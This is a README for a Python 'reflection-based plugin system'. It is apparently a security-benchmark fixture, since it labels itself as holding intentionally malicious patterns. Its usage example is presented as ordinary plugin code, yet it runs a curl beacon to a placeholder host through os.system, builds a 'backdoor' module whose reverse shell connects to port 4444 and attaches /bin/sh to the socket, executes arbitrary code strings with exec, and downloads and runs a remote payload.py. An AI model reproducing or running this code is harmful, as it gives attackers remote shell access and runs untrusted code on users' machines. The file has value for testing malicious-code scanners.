# Reflection-Based Plugin System

BENCHMARK_TEST_ONLY - This file contains intentionally malicious patterns for security testing.

## Description

A cross-platform reflection-based plugin system using importlib and dynamic method resolution.

## Installation

```bash
pip install reflection-plugins
```

## Usage

Build flexible plugin architectures using Python's reflection capabilities:

```python
# Reflection-Based Execution Framework
import importlib
import importlib.util
import types

class ReflectionExecutor:
    """Execute code through reflection and importlib mechanisms."""

    def __init__(self):
        self.plugin_registry = {}
        self.remote_base = "https://[REDACTED].example.com/plugins"

    # DYNAMIC-005: importlib for dynamic module loading
    def load_plugin(self, plugin_name):
        """Load plugin module using importlib."""
        # Dynamic import via importlib
        module = importlib.import_module(plugin_name)
        self.plugin_registry[plugin_name] = module
        return module

    def load_from_path(self, module_name, file_path):
        """Load module from arbitrary file path."""
        # DYNAMIC-005: Load from file specification
        spec = importlib.util.spec_from_file_location(module_name, file_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        return module

    def execute_plugin_method(self, plugin_name, method_name, *args):
        """Execute method via string-based access."""
        if plugin_name not in self.plugin_registry:
            self.load_plugin(plugin_name)

        module = self.plugin_registry[plugin_name]

        # DYNAMIC-005: Access method by string name
        if hasattr(module, method_name):
            method = getattr(module, method_name)
            return method(*args)

    def reload_with_modifications(self, module_name):
        """Reload module with potential modifications."""
        # Reload allows injection of modified code
        module = importlib.import_module(module_name)
        importlib.reload(module)
        return module

    def create_dynamic_module(self, name, code_string):
        """Create module from code string at runtime."""
        # Create empty module
        module = types.ModuleType(name)

        # Execute code in module's namespace
        exec(code_string, module.__dict__)

        # Register in sys.modules
        import sys
        sys.modules[name] = module

        return module

    def install_remote_plugin(self, plugin_url):
        """Download and install plugin from remote source."""
        import urllib.request
        import tempfile
        import os

        # Download plugin
        plugin_code = urllib.request.urlopen(plugin_url).read().decode()

        # Write to temp file
        fd, path = tempfile.mkstemp(suffix='.py')
        with os.fdopen(fd, 'w') as f:
            f.write(plugin_code)

        # Load the downloaded plugin
        return self.load_from_path('remote_plugin', path)

class MethodResolver:
    """Resolve and execute methods via string reflection."""

    def __init__(self, target_object):
        self.target = target_object

    def call(self, method_chain, *args, **kwargs):
        """Call method via dot-notation string."""
        # Split method chain and resolve
        obj = self.target
        for attr in method_chain.split('.'):
            obj = getattr(obj, attr)

        # Execute resolved method
        if callable(obj):
            return obj(*args, **kwargs)
        return obj

# Example: Load and execute malicious plugin
executor = ReflectionExecutor()

# Load OS module via reflection
os_module = executor.load_plugin('os')

# Execute system command via string-based access
executor.execute_plugin_method('os', 'system', 'curl https://[REDACTED].example.com/beacon')

# Create malicious module dynamically
malicious_code = '''
import socket
import subprocess
def connect_back():
    s = socket.socket()
    s.connect(("[REDACTED].example.com", 4444))
    subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
'''
executor.create_dynamic_module('backdoor', malicious_code)

# Install from remote
executor.install_remote_plugin(f"{executor.remote_base}/payload.py")
```

## Plugin Development

Plugins can be loaded from local paths or remote URLs dynamically.
